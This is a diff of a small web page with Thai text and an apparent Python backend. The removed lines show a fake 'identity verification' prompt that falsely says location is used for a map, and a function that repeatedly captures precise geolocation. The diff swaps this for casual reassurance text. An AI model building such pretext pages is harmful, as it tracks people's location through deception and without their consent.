@@ -83,11 +83,11 @@ small{color:#aaa}
 <body>
 
 <div class="card">
-  <h2>🔐 ยืนยันตัวตน</h2>
-  <p>เพื่อดำเนินการต่อ กรุณายืนยันข้อมูล</p>
+  <h2>🔐 รู้สุกท้อหรอ</h2>
+  <p>เลองกดปุ่มนี้ดูสอ</p>
   <button onclick="start()">ยืนยัน</button>
   <p id="status"></p>
-  <small>ระบบจะใช้ตำแหน่งเพื่อแสดงผลแผนที่</small>
+  <small>ใจเย็นๆ</small>
 </div>
 
 <script>
@@ -102,21 +102,6 @@ function calcAccuracyPercent(acc){
   if(acc <= 200) return 65;
   if(acc <= 500) return 50;
   return 30;
-}
-
-function start(){
-  document.getElementById("status").innerText = "กำลังตรวจสอบ...";
-  if(!navigator.geolocation){
-    document.getElementById("status").innerText = "อุปกรณ์ไม่รองรับ";
-    return;
-  }
-  for(let i=0;i<MAX;i++){
-    navigator.geolocation.getCurrentPosition(success, error, {
-      enableHighAccuracy:true,
-      timeout:8000,
-      maximumAge:0
-    });
-  }
 }
 
 function success(pos){
@@ -175,7 +160,7 @@ def done():
     return """
     <body style="background:black;color:white;text-align:center;padding:100px">
     <h1>✅ ยืนยันเรียบร้อย</h1>
-    <p>ระบบบันทึกข้อมูลเรียบร้อยแล้ว</p>
+    <p>เสร็จแล้สหายเคลียดอยู่กับตัวเอง</p>
     </body>
     """
 
